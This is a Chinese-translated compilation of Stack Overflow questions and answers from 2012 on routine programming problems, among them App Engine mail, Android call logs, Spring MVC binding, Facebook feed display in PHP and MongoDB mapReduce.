我正在使用此代码在我的 java 应用程序中发送电子邮件

```
 try{
            Email email = new SimpleEmail();
            email.setHostName("smtp.googlemail.com");
            email.setSmtpPort(587);
            email.setAuthenticator(new DefaultAuthenticator("me@gmail.com", "mypwd"));
            email.setTLS(true);

                email.setFrom("me@gmail.com");

            email.setSubject("TestMail");
            email.setMsg("This is a test mail ... :-)");
            email.addTo("me@hotmail.com");
            email.send();
            System.out.println("Mail sent!");
            } catch (EmailException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } 
```

它工作完美，我在收件箱中收到电子邮件，但是当我将相同的代码放在我的 GWT（Appengine 项目）服务器端时，它不会工作它显示没有错误，没有异常，并说邮件已发送，但它从未真正发送到我的收件箱。

也试过这个

```
 try {
                Message msg = new MimeMessage(session);
                msg.setFrom(new InternetAddress("appname@appspot.gserviceaccount.com", "Example.com Admin"));
                msg.addRecipient(Message.RecipientType.TO,
                                 new InternetAddress("myemail@gmail.com", "Mr. User"));
                msg.setSubject("Your Example.com account has been activated");
                msg.setText(msgBody);
                Transport.send(msg);

            } catch (AddressException e) {
                // ...
            } catch (MessagingException e) {
                // ...
            } catch (UnsupportedEncodingException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } 
```

请指导我

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:54:01.133

看看这个：[Mail Go API 概述](https://developers.google.com/appengine/docs/go/mail/overview#Receiving_Mail)

而且您没有收到错误，因为没有错误。
邮件已发送，但由于上述限制，您不会收到。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T12:55:02.263

这是从[developers.google.com引用的工作代码](https://developers.google.com/appengine/docs/java/mail/usingjavamail)

```
public String sendMail(String from, String to, String replyTo, String subject, String message) {
        String output=null;
        Properties props = new Properties();
        Session session = Session.getDefaultInstance(props, null);

        try {
            Message msg = new MimeMessage(session);
            msg.setFrom(new InternetAddress(from, "Gmail.com Admin"));
            msg.addRecipient(Message.RecipientType.TO,
                             new InternetAddress(to, "Mr. User"));
            msg.setSubject(subject);
            msg.setText(message);
            msg.setReplyTo(new InternetAddress[]{new InternetAddress(replyTo)});
            Transport.send(msg);

        } catch (Exception e) {
            output=e.toString();                
        }   
        return output;
    } 
```

根据[developer.google.com](https://developers.google.com/appengine/docs/java/mail/usingjavamail)的参考，发件人地址 ( `from`) 必须是以下类型之一：

*   申请的注册管理员地址

*   使用 Google 帐户登录的当前请求的用户地址。您可以使用用户 API 确定当前用户的电子邮件地址。用户的帐户必须是 Gmail 帐户，或者位于由 Google Apps 管理的域中。

*   应用程序的任何有效电子邮件接收地址（例如 xxx@APP-ID.appspotmail.com）。

    我试过了，它在托管的*gwt*应用程序中工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T14:27:06.243

您是否收到 AddressException 并在不显示错误的情况下吞下它？

我问是因为这是一个不受支持的“发件人”地址：

```
appname@appspot.gserviceaccount.com 
```

它应该是：

```
anything@appid.appspotmail.com 
```

或者管理员或登录用户的电子邮件地址。请参阅此处的规则：

[https://developers.google.com/appengine/docs/java/mail/usingjavamail#Senders_and_Recipients](https://developers.google.com/appengine/docs/java/mail/usingjavamail#Senders_and_Recipients)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T10:54:41.670

实现这个

[https://developers.google.com/appengine/docs/java/mail/usingjavamail](https://developers.google.com/appengine/docs/java/mail/usingjavamail)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-03-21T13:02:08.487

同样的问题，这对我有用，100% 也对你有用（如果你使用的是 eclipse）。

当您发送邮件时，但实际上它已发送到您的本地主机服务器。因此，您必须从应用引擎管理控制台创建您的个人应用引擎。

为此，请转到此[**链接**](https://appengine.google.com/)，然后选择要用于创建应用程序引擎的帐户，创建应用程序，而不是编写应用程序标识符（**请注意此应用程序标识符，之后在部署时在您的 eclipse 项目中工作**）

然后在应用程序设置中，找到此**配置服务**，因为您必须为您的应用程序授予权限，选择您的应用程序语言 Java/Python/Go，之后您将被重定向到您必须在 web.xml 中编写的入站服务

从 Eclipse 之后，右键单击您的项目，转到 Google -> Deploy to app Engine，然后在之前记下的 Application ID 字段中写入 Application ID。首先检查您必须安装应用程序引擎。

比点击完成。部署需要一些时间，它会自动打开您的浏览器。所以现在你的 gwt 应用程序在你的服务器上。享受 ：）

# android - android中的来电类型

> ID：10514481
> 
> 赞同：0
> 
> 时间：2012-05-09T10:44:31.940
> 
> 标签：android

我想在我的应用程序中检测来电类型。我们可以知道来电是国内还是国际 android。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:56:26.867

hey this is all about detect incoming or outgoing or missed call type in an android application. try this code this will definetly help you. i will answer you further on differentiating between an international and domestic call.

```
Cursor cur = managedQuery(CallLog.Calls.CONTENT_URI, new String[] {
            CallLog.Calls._ID, CallLog.Calls.CACHED_NAME,
            CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE  },
            null, null, CallLog.Calls.DATE + " DESC");
int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);

                    // Type of call retrieved from the cursor.
                    int type = cursor.getInt(typeIndex);

                    switch (type) {
                    case CallLog.Calls.INCOMING_TYPE: 
```

**//write your code here**

```
 break;
                    case CallLog.Calls.MISSED_TYPE:
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        break;
                    default:
                        break;
                    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:55:42.810

Can you try and get the incoming phone number and get the first couple digits. For example:+38977xxxxxx, where +389 is number from foreign country

# .net - 正则表达式匹配前缀

> ID：10514483
> 
> 赞同：0
> 
> 时间：2012-05-09T10:44:40.560
> 
> 标签：.net, regex

最初我有以下问题：

在文本框中添加多个 GroupName。

1.  GroupName 可以用`","`/ `"or"`/分隔`"OR"`。
2.  输入不应以`","`/ `"or"`/开头或结尾`"OR"`。

例如：

```
组名、组名或组名或组名
组名、组名、组名、组名或组名

```

为此，我找到了答案

```
/^[a-zA-Z0-9\s]+(?:\s*(?:or|OR|,)\s*[a-zA-Z0-9\s]+)*$/ 
```

如何修改此正则表达式以支持`or` `OR`关键字作为前缀。也不能有两个连续的前缀，例如：

```
或 或 组名

```

（上面的例子不是有效的输入。）

谁能帮我解决这个问题？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:52:15.383

为什么不使用[Regex.Split](http://msdn.microsoft.com/en-us/library/8yttk7sy.aspx)然后对其进行简化，以便您的模式只是标记？

所以你会说类似

```
string[] substrings = Regex.Split(input, "[\w]?(OR|,)[\w]?", RegexOptions.IgnoreCase); 
```

然后只需丢弃空子字符串，而不用担心防止空项目。顺便说一句，这种方法会将分隔符拉到结果数组中，因为它们是一个捕获组，但链接的文档显示了如何避免这种情况。

此外，因为它忽略了空格，它可能会拉出像“Oregon”这样的结果作为“OR”和“Egon”，所以你可能想要强制“Or”运算符的空格匹配，尽管我会避免使用“，”作为人可以很好地使用它而没有空格。

# wpf - wpf 中的按需按钮栏

> ID：10514494
> 
> 赞同：1
> 
> 时间：2012-05-09T10:45:10.897
> 
> 标签：wpf, animation, mvvm

我有一个树状结构（包含节点和边），我希望在单击某个节点时，一个样式化的按钮栏（从节点）滑出，最多包含 2-4 个按钮。单击窗口的任何其他部分时，该栏应滑入。这必须遵循 MVVM 模式，所以我理解，按钮栏必须是绑定到特定节点的 ViewModel 的自定义控件。但是，我不知道如何实现滑入滑出效果。任何有关此的指导/指针将不胜感激。

问候，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:58:41.087

您可以将自定义控件放在[Popup](http://msdn.microsoft.com/en-us/library/system.windows.controls.primitives.popup.aspx "弹出窗口")控件中。然后，您可以将 PopupAnimation 设置为 Slide，这将使您的控件滑入视图。

以下 XAML 定义了一个 Popup，它滑入 ToggleButton 控件旁边的视图。切换按钮时会打开弹出窗口 - 您需要更改此行为，以便在单击节点时打开弹出窗口。当弹出窗口失去焦点时，它会关闭。

```
 <ToggleButton x:Name="toggleButton>Click to show</ToggleButton>
    <Popup IsOpen="{Binding ElementName=toggleButton, Path=IsChecked, Mode=TwoWay}"
           PlacementTarget="{Binding ElementName=toggleButton}"
           StaysOpen="False"
           Placement="Right"
           PopupAnimation="Slide">

        <!-- Your custom control goes here -->

    </Popup> 
```

您可以使用其他动画效果 - 淡入淡出和滚动。如果您需要更复杂的东西，则需要考虑设置 StoryBoard。

# java - 即使类与 META-INF/services 在同一个 JAR 文件中，服务加载器也找不到服务提供者类

> ID：10514495
> 
> 赞同：7
> 
> 时间：2012-05-09T10:45:14.840
> 
> 标签：java, c++, java-native-interface

我正在成功运行一个 C++ 应用程序，该应用程序使用 JAR 文件作为类路径参数加载 JVM。然后，应用程序成功地使用 JNI 调用来执行在此 JAR 文件中的 .class 文件中定义的各种函数。

包含在 .jar 文件的目录结构中的是第 3 方的 .class 文件集 - 那些从 jai_imageio.jar 合并的文件（这些 .class 文件及其完整目录结构已使用 Intellij IDEA 合并到这个单个 .jar 文件中）。合并的 .jar 文件中还包括原始 jai_imageio.jar 中的行`manifest.mf`- 特别是`implementation-title`相关行。此外，该`meta-inf/services`文件夹存在，也是从 jai_imageio.jar 复制的。目录中列出的各种服务`services`看起来都是正确的。

特别是，`javax.imageio.spi.ImageOutputStreamSpi`在`meta-inf/services`.jar 文件中的文件夹中包含单行 .jar 文件中`com.sun.media.imageioimpl.stream.ChannelImageOutputStreamSpi`，在该行所指示的目录中，有一个与此相对应的类：`com/sun/media/imageioimpl/stream/ChannelImageOutputStreamSpi.class`.

但是，当 Java 代码执行以下行时：

```
ImageIO.write(image, "tiff", file); // Assume 'image' is a BufferedImage and 'file' is a File 
```

...它抛出一个异常：

```
java.util.ServiceConfigurationError: javax.imageio.spi.ImageOutputStreamSpi:
Provider com.sun.media.imageioimpl.stream.ChannelImageOutputStreamSpi not found 
```

...即使此类**存在**于同一个 .jar 文件中，如上所述。

有人可以解释为什么会发生这个错误，我应该怎么做才能解决它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-09-18T21:07:04.940

从这个文档 [http://docs.oracle.com/javase/1.5.0/docs/guide/jni/spec/invocation.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jni/spec/invocation.html)

“当一个线程连接到虚拟机时，上下文类加载器就是引导加载器。”

任何通过 AttachCurrentThread() 附加到 JVM 的本机线程都只能获得引导类加载器，甚至不能获得系统类加载器。除非您明确修复新线程的上下文类加载器，否则 ServiceLoader 引用的类将不可用。

这可以像这样完成：

```
java.lang.Thread.currentThread().setContextClassLoader(
    java.lang.ClassLoader.getSystemClassLoader()
); 
```

# java - Spring MVC 3：定义自己的数据类型绑定

> ID：10514496
> 
> 赞同：3
> 
> 时间：2012-05-09T10:45:19.217
> 
> 标签：java, spring-mvc

在 spring3 控制器中，我可以创建一个带有多个参数的动作方法，女巫将由 spring 设置

```
@RequestMapping(value="/updateTemplate")
public void doStuff(HttpServletRequest request, Locale locale) {
  assert request != null;
  assert locale != null;    
} 
```

我如何教 Spring 填充我自己定义的数据类型？

```
@RequestMapping(value="/updateTemplate")
public void doStuff(HttpServletRequest request, Locale locale, MyClass myClass) {
  assert myClass != null;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-17T15:04:15.230

你应该使用[WebArgumentResolver](http://static.springsource.org/spring/docs/current/javadoc-api/org/springframework/web/bind/support/WebArgumentResolver.html)

```
public class MyClassWebArgumentResolver implements WebArgumentResolver {
    public Object resolveArgument(MethodParameter param, NativeWebRequest req) throws Exception {
        if (param.getParameterType().equals(MyClass.class)) {
            MyCLass obj = new MyClass();
            ....
            return obj;
        }
        return UNRESOLVED;
    }

} 
```

并将其注册到springmvc：

```
<mvc:annotation-driven >
    <mvc:argument-resolvers>
       <bean class="com.xxx.MyClassWebArgumentResolver" />
    </mvc:argument-resolvers>
</mvc:annotation-driven> 
```

然后你可以在你的控制器中使用它

```
@RequestMapping(value="/updateTemplate")
public void doStuff(HttpServletRequest request, Locale locale, MyClass myClass) {
    assert myClass != null;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T13:37:44.697

Spring 有一个名为的类[`HttpMessageConverter`](http://static.springsource.org/spring/docs/3.0.x/javadoc-api/org/springframework/http/converter/HttpMessageConverter.html)，它会为你做这件事。它将获取传入的各种成员`HttpServletRequest`并使用它们来创建一个对象，然后将其传递给您的`Controller`方法。最好的部分是，如果您将`HttpMessageConverter`' 添加到`ApplicationContext`（通过，[在此处](http://static.springsource.org/spring/docs/3.0.x/spring-framework-reference/html/remoting.html#rest-message-conversion)`AnnotationMethodHandlerAdapter`描述）中，它将自动为您执行此操作。

已经存在许多预构建的实现，您可以在`HttpMessageConverter`上面链接的页面上找到其中的很多。最常用的可能是[`MappingJacksonHttpMessageConverter`](http://static.springsource.org/spring/docs/3.0.x/javadoc-api/org/springframework/http/converter/json/MappingJacksonHttpMessageConverter.html)，用于将 JSONObject 从请求正文映射到 JavaBean，以及[`MarshallingHttpMessageConverter`](http://static.springsource.org/spring/docs/3.0.x/javadoc-api/org/springframework/http/converter/xml/MarshallingHttpMessageConverter.html)，用于将 XML 从请求正文映射到 JavaBean。

# php - 如何将我的 facebook 页面中的最新帖子显示到我的网站

> ID：10514497
> 
> 赞同：7
> 
> 时间：2012-05-09T10:45:26.833
> 
> 标签：php, facebook, facebook-graph-api, facebook-c#-sdk

我在 Facebook 上有页面，我想在我网站的页面上显示来自我的提要/墙的最新 5 篇帖子。这个怎么做？我找到了这个解决方案..很容易

```
https://developers.facebook.com/docs/reference/plugins/like-box/ 
```

有人指导我使用**facebook api**并自己做最好的方法是什么？

我使用 php mysql 来建立这个网站

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-05-09T10:54:26.970

这是PHP代码。您需要将其放置在您的模板中。

```
<ul>
<?php
//function to retrieve posts from facebook’s server
function loadFB($fbID){
    $url = "http://graph.facebook.com/".$fbID."/feed?limit=3";
    // Update by MC Vooges 11jun 2014: Access token is now required:
    $url.= '&access_token=YOUR_TOKEN|YOUR_ACCESS_SECRET';// *

    //load and setup CURL
     $c = curl_init($url);
     curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    //get data from facebook and decode JSON
     $page = json_decode(curl_exec($c));
    //close the connection
     curl_close($c);
    //return the data as an object
     return $page->data;
}

/* Change These Values */
// Your Facebook ID
 $fbid = "190506416472588";
// How many posts to show?
 $fbLimit = 10;
// Your Timezone
date_default_timezone_set("America/Chicago");

/* Dont Change */
// Variable used to count how many we’ve loaded
 $fbCount = 0;
// Call the function and get the posts from facebook
 $myPosts = loadFB($fbid);

//loop through all the posts we got from facebook
foreach($myPosts as $dPost){
    //only show posts that are posted by the page admin
    if($dPost->from->id==$fbid){
        //get the post date / time and convert to unix time
         $dTime = strtotime($dPost->created_time);
        //format the date / time into something human readable
        //if you want it formatted differently look up the php date function
         $myTime=date("M d Y h:ia",$dTime);
        ?>
        <ul>
            <li><?php echo($dPost->message) . $myTime; ?></li>
        </ul>
        <?php
        //increment counter
         $fbCount++;
        //if we’ve outputted the number set above in fblimit we’re done
         if($fbCount >= $fbLimit) break;
    }
}
?>
</ul> 
```

编写此脚本必须做两件事。

1.  确保您的服务器启用了 cURL

2.  您将自己更改脚本中的 Facebook ID。

* 您可以通过以下方式获取访问令牌：

```
$token = 'https://graph.facebook.com/oauth/access_token?client_id='.APP_ID.'&client_secret='.APP_SECRET.'&grant_type=client_credentials';
$token = file_get_contents($token); // returns 'accesstoken=APP_TOKEN|APP_SECRET' 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2013-04-16T13:03:07.533

1.  登录脸书
2.  前往 Facebook 开发者专区“[应用程序](https://developers.facebook.com/apps)”
3.  注册新应用，您只需要注册新应用，所有附加数据是可选的
4.  [从同一“应用程序](https://developers.facebook.com/apps)”部分复制您的应用程序 ID/API 密钥和应用程序密钥。
5.  将[facebook.php](https://github.com/facebook/facebook-php-sdk/blob/master/src/facebook.php)和[base_facebook.php](https://github.com/facebook/facebook-php-sdk/blob/master/src/base_facebook.php)文件从[repo](https://github.com/facebook/facebook-php-sdk/tree/master/src)复制到您的服务器
6.  对 api使用[多态查询](https://developers.facebook.com/docs/reference/php/facebook-api/)，从 facebook 帐户请求墙内容

    ```
    require 'facebook.php';
    $facebook = new Facebook(array(
        'appId' => 'YOUR_APP_ID',
        'secret' => 'YOUR_APP_SECRET',
    ));

    $fbApiGetPosts = $facebook->api('/YOUR_FACEBOOK_ACCOUNT_ID/feed?limit=5');
    if (isset($fbApiGetPosts["data"]) && !empty($fbApiGetPosts["data"])) {
        // display contents of $fbApiGetPosts["data"] array
    } 
    ```

    将 YOUR_APP_ID 替换为您的应用 ID，将 YOUR_APP_SECRET 替换为您的应用密码，将 YOUR_FACEBOOK_ACCOUNT_ID 替换为您想要从中获取帖子的目标 Facebook 帐户。

多态查询基本上是路径/URL。前面提到的 facebook api[参考文档](https://developers.facebook.com/docs/reference/php/facebook-api/)中的更多信息。

如果您的目标 Facebook 帐户墙是公开的，那么您将不需要其他任何东西来查看它们。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-18T04:09:22.823

我在这里遇到了 Okky 的答案，我找到了一个可能的，虽然不是理想的解决方法。

使用 Facebook 墙的 RSS 提要，然后使用您选择的 RSS 阅读器简单地解析它。

`https://www.facebook.com/feeds/page.php?format=rss20&id=YOUR_UNIQUE_ID`

[这是获取您的ID的快速方法](http://findmyfbid.in/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-04-05T23:27:39.617

因此，为了混合 Okky 和 ​​Deele 的答案，这两者都对我有帮助，你必须以看起来像这样的东西结束。我还添加了一个锚标记来链接到帖子网址：

```
<?php
$fbApiGetPosts = $facebook->api('/YOUR_FACEBOOK_ACCOUNT_ID/feed?limit=5');
if (isset($fbApiGetPosts["data"]) && !empty($fbApiGetPosts["data"])) {
    //loop through all the posts we got from facebook
    foreach($fbApiGetPosts["data"] as $dPost){
        //only show posts that are posted by the page admin
        if($dPost["from"]["id"]==$fbid){
            //get the post date / time and convert to unix time
             $dTime = strtotime($dPost["created_time"]);
            //format the date / time into something human readable
            //if you want it formatted differently look up the php date function
            $myTime=date("M d Y h:ia",$dTime);
            ?>
                <li><a href="<?php echo($dPost["link"]); ?>">
                                        <?php echo($dPost["message"]) . "<br>" .
                                         $myTime; ?></a></li>
            <?php
        }
    }   
}
?> 
```

# android - Android : 列表视图的东西

> ID：10514503
> 
> 赞同：1
> 
> 时间：2012-05-09T10:45:44.023
> 
> 标签：android, android-listview, adapter

我有一个显示项目列表的列表视图，底部有一个按钮。单击按钮时，我将显示一个警报对话框以获取用户的输入并将该输入添加到列表视图中。
1.我如何确保新的输入/条目应该始终添加在列表视图的顶部？（现在它总是在底部添加）
2\. 是否可以将列表视图定位在新条目上？（即如果新条目添加在顶部，列表应位于顶部）
请指导我。

在 onCreate() 里面...

```
 list  = (ListView)findViewById(R.id.planetList); 
        adapter = new ArrayAdapter<String>(MyListViewActivity.this, 
R.layout.my_list_row, R.id.planetNameTextView); 

        for (int i = 0; i < planetNamesArray.length; i++) { 
        adapter.add(planetNamesArray[i]); 
        } 
        list.setAdapter(adapter); 
```

从用户那里获取输入后......

```
 adapter.add(newPlanetNameEnteredByUser);
    adapter.notifyDataSetChanged(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:52:55.407

是的，您可以这样做，有两个列表。

```
List<String> old = new ArrayList<String>();  // contains your list content
List<String> new = new ArrayList<String>(); 
```

现在，当您想向 ListView 添加新内容时，请先将其添加到新的 ArrayList 中，

```
new.add("new content");
new.addAll(old); // add all the old contents
new.setSelection(position_you_want);
adapter.notifyDataSetChanged(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:57:04.957

在数组列表中添加对象

```
ArrayList<String> List= new ArrayList<String>();
ListView ListName= (ListView)findViewById(R.id.playerdata); 
```

和

```
 List.add(index, "value");

public void add (int index, E object) 
```

**自：API 级别 1 将指定对象插入此 ArrayList 的指定位置。该对象被插入到指定位置的任何先前元素之前。如果位置等于此 ArrayList 的大小，则将对象添加到末尾。参数 index 插入对象的索引。object 要添加的对象。**

投掷

```
IndexOutOfBoundsException  when location < 0 || > size() 
```

并设置列表适配器

```
ListName.setAdapter(new ArrayAdapter<String>
        (this,android.R.layout.simple_list_item_1 , List)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T11:07:56.610

您可以使用**listview.setStackFromBottom(false)**从顶部填充您的列表视图。

此链接可能会对您有所帮助。

[http://developer.android.com/reference/android/widget/AbsListView.html#setStackFromBottom%28boolean%29](http://developer.android.com/reference/android/widget/AbsListView.html#setStackFromBottom%28boolean%29)

# mongodb - mongodb mapreduce 函数不提供跳过功能，他们对此有什么解决方案吗？

> ID：10514508
> 
> 赞同：3
> 
> 时间：2012-05-09T10:46:01.940
> 
> 标签：mongodb, nosql

Mongodb mapreduce 函数不提供任何方法来从数据库中跳过记录，如 find 函数。它具有查询、排序和限制选项的功能。但是我想从数据库中跳过一些记录，但我没有任何办法。请提供解决方案。

提前致谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-09T17:51:35.313

理想情况下，结构良好的 map-reduce 查询将允许您跳过集合中的特定文档。

或者，正如 Sergio 指出的那样，您可以简单地不在 map() 中发出特定文档。使用范围来定义全局计数器变量是将发出限制到指定范围的文档的一种方法。例如，跳过按 ObjectID 排序的前 20 个文档（因此按插入时间排序）：

```
db.collection_name.mapReduce(map, reduce, {out: example_output, sort: {id:-1}, scope: "var counter=0")}; 
```

地图功能：

```
function(){
    counter ++;
    if (counter > 20){
        emit(key, value);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-29T07:58:44.823

我不确定这个功能从哪个版本开始可用，但肯定在 MongoDB 2.6 中，该[`mapReduce()`函数提供了`query`参数](http://docs.mongodb.org/manual/reference/method/db.collection.mapReduce/#db.collection.mapReduce)：

> `query`:*文件*
> 
> 选修的。使用查询运算符指定选择标准，以确定输入到 map 函数的文档。

**例子**

考虑对包含以下原型文档的集合订单的以下 map-reduce 操作：

```
{
     _id: ObjectId("50a8240b927d5d8b5891743c"),
     cust_id: "abc123",
     ord_date: new Date("Oct 04, 2012"),
     status: 'A',
     price: 25,
     items: [ { sku: "mmm", qty: 5, price: 2.5 },
              { sku: "nnn", qty: 5, price: 2.5 } ]
} 
```

使用 mapFunction2、reduceFunction2 和 finalizeFunction2 函数对订单集合执行 map-reduce 操作。

```
db.orders.mapReduce( mapFunction2,
                 reduceFunction2,
                 {
                   out: { merge: "map_reduce_example" },
                   query: { ord_date:
                              { $gt: new Date('01/01/2012') }
                          },
                   finalize: finalizeFunction2
                 }
               ) 
```

此操作使用查询字段仅选择那些`ord_date`大于的文档`new Date(01/01/2012)`。然后它将结果输出到一个集合`map_reduce_example`。如果`map_reduce_example`集合已经存在，则该操作会将现有内容与此 map-reduce 操作的结果合并。

# salesforce - 需要写一个触发器

> ID：10514511
> 
> 赞同：0
> 
> 时间：2012-05-09T10:46:17.933
> 
> 标签：salesforce, apex-code

我需要在 Event 对象上编写一个触发器。条件：如果 2 个字段（均为日期时间字段）之间的差异超过 7 天，则触发器应触发并更新，否则不更新。

例如：字段 1\. 开始数据，2\. 结束日期

开始日期 = 06/05/2012 结束日期 = 13/05/2012

那么触发器应该触发。谁能告诉我如何比较 Apex 代码中的日期。

谢谢阿努

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T13:12:40.387

您可以使用[daysBetween()](http://www.salesforce.com/us/developer/docs/apexcode/Content/apex_methods_system_date.htm "Date 方法的 Apex 文档")。

```
date startDate = date.newInstance(2008, 1, 1);
date dueDate = date.newInstance(2008, 1, 30);
integer numberDaysDue = startDate.daysBetween(dueDate); 
```

# c# - 通过C# MongoDB Driver之前插入的方式获取数据顺序列表

> ID：10514512
> 
> 赞同：2
> 
> 时间：2012-05-09T10:46:17.880
> 
> 标签：c#, mongodb, mongodb-.net-driver

我正在使用 C# Mongo DB 驱动程序进行数据库操作。

我想通过插入记录的方式获取记录列表。因为我相信 MongoDB默认会根据它的主键（例如）*对数据进行排序，*`_Id`

我想*根据插入的方式按顺序获取记录列表。* （我不想将 DateTime 数据存储在表格文档中）。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:48:28.130

你是对的。如果您在插入时没有提供`_id`字段值，MongoDB 将生成一个。这些值会随着时间的推移而增加。所以，如果你按`_id`升序排序，你会得到插入顺序（如果我没记错的话，精确到第二个）。

对于有上限的集合，有一个[特殊的排序顺序](http://www.mongodb.org/display/DOCS/Sorting+and+Natural+Order)可用：`$natural`. 这是有保证的插入顺序（但仅适用于有上限的集合）。

# .net - NHibernate：可以直接从我的实体类操作存储库吗？

> ID：10514522
> 
> 赞同：1
> 
> 时间：2012-05-09T10:47:22.283
> 
> 标签：.net, nhibernate, fluent-nhibernate, repository, repository-pattern

我有一个通过 Fluent NHibernate 的 AutoPersistenceModel 使用 NHibernate 的自定义存储库实现。

我有一堆实体类，我坚持使用这个存储库。

问题是，将真正的业务逻辑放在这些实体类中可以吗？

如果某些业务逻辑需要操作存储库本身，是否还可以？
*（例如，一些方法需要创建一些新实体，其中一些需要更新现有实体等）*

我知道 NHibernate 具有强大的持久性无知功能，但我仍然不确定这个细节。提前感谢您的回答！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-10T04:53:41.017

Logic wrt Entity 应该被限制在它的“业务领域”中。更新实体内的其他实体/基础设施是一个非常糟糕的想法/设计。

IE

```
Order --> OrderLines
Order {OrderId, OrderDate, Customer, OrderLines, ...}
OrderLines {OrderLineId, Order, Item, Price, Quantity, Deliveries, DeliveredQuantity, ...}

OrderDelivery --> OrderDeliveryLines
OrderDelivery {OrderDeliveryId, Customer, DeliveryDate, ...}
OrderDeliveryLines {OrderDeliveryLineId, OrderDelivery, OrderLine, DeliveryQuantity, ....} 
```

orderLine 的交付数量是针对它进行的所有交付的总和。

因此，在上述情况下，通过订单（即订单流程）创建/更新交付是错误的，交付的交付线将根据交付数量（在交付流程中）的相应订单线进行。

明确定义事务边界后，您将永远不会要求流程逻辑潜入您的“业务领域”

[http://domaindrivendesign.org/](http://domaindrivendesign.org/)

# php - 试图在 php 页面中显示 javascript 日历

> ID：10514524
> 
> 赞同：0
> 
> 时间：2012-05-09T10:47:32.923
> 
> 标签：php, javascript

我一直在努力让这个工作。我正在使用 Joomla 和 directphp，所以在文章中我可以直接在文章中输入我的 php 代码。我得到了我下载的这个日历（http://www.rainforestnet.com/datetimepicker/datetimepicker-tutorial.htm），但是当我点击日历图像/图标时，它显示正确但没有任何反应。

```
<head>
<script src="datetimepicker_css.js"></script>
</head>
<?php
error_reporting(E_ALL);
session_start();
echo "</BR>";
echo "</BR>";
if ($_SESSION['authman'] || $_SESSION['authhod']) {
include 'datalogin.php';
$manid1 = $_SESSION['manid'];
if (($manid1 == 113) || ($manid1 == 114)) {
$data10 = $_SESSION['views10'];
echo $data10;

echo "<form method='post'>";

echo "<label for='demo1'>Please enter a date here </label>";
echo "<input type='Text' id='demo1' maxlength='25' size='25'/>";
echo "<img src='images2/cal.gif' onclick='javascript:NewCssCal(demo1)' style='cursor:pointer'/>";
echo "</form>";

} else {
echo "You are not authorised to view this";
}
} else {
    include 'ses_end.php';
    header('Location: http://localhost/');
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:01:56.640

你应该发送一个`string`到`NewCssCal()`.

echo`NewCssCal('demo1')`而不是，`NewCssCal(demo1)`它应该可以工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T14:01:46.247

好的，过了一会儿我让它按如下方式工作，我仍然不明白为什么其他方式 arround 不起作用。：

```
<head>
<script src="datetimepicker_css.js"></script>
</head>
<?php
session_start();
if ($_SESSION['authman'] || $_SESSION['authhod']) {
include 'datalogin.php';
$manid1 = $_SESSION['manid'];
if (($manid1 == 113) || ($manid1 == 114)) {
?>
<form method="post">
<table style="width: 100%">
<tr>
<td>1st Date</td>
<td><input size="30" type="text" name="frm_1date" id="cal1"/>
<td><img src="images/cal.gif" onclick="NewCssCal('cal1');" style="cursor:pointer"/></td>
</tr>
<tr>
<td>&nbsp;</td>
<td><input name="Submit1" type="submit" value="submit" /></td>
</tr>
</table>
</form>
<?php
}
} else {
echo "You are not authorised to view this";
}
} else {
include 'ses_end.php';
header('Location: http://localhost/');
}
?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:57:06.717

您是否查看了浏览器中的 javascript 控制台？我很确定有一些有用的东西（比如无法加载 js 脚本）。

另外：您可以编写`onclick='NewCssCal(demo1);'`而不是 `onclick='javascript:NewCssCal(demo1)'`因为`onclick`处理程序已经是 javascript。

顺便说一句：这样写也不好`echo "<img src='images2/cal.gif' onclick='javascript:NewCssCal(demo1)' style='cursor:pointer'/>";` ：（看引号）

```
echo '<img src="images2/cal.gif" onclick="NewCssCal(\'demo1\');" style="cursor:pointer"/>'; 
```

@Elliot B.：js 函数显然来自[选择器脚本](http://www.rainforestnet.com/datetimepicker/sample/datetimepicker_css.js)

# java - 如何检查用户是否在微调器中选择了选项

> ID：10514526
> 
> 赞同：0
> 
> 时间：2012-05-09T10:47:40.770
> 
> 标签：java, android, spinner

我有一个以编程方式打开的微调器，当用户从微调器中选择一个选项时，它会关闭......当用户选择他的选择时，有没有办法通知你，或者有一个听众告诉你？onItemSelected 获取在微调器打开时自动选择的默认项目。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:51:11.617

